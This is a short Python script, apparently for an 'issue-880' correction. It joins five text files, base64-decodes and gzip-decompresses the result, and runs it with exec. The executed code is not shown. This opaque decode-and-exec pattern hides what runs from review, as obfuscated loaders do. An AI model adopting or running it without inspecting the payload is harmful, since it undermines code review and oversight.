from pathlib import Path
import base64
import gzip

parts_dir = Path(__file__).with_name("issue-880-correction-parts")
payload = "".join(
    (parts_dir / f"part{index}.txt").read_text(encoding="ascii").strip()
    for index in range(1, 6)
)
source = gzip.decompress(base64.b64decode(payload))
exec(compile(source, "<issue-880-corrections>", "exec"))
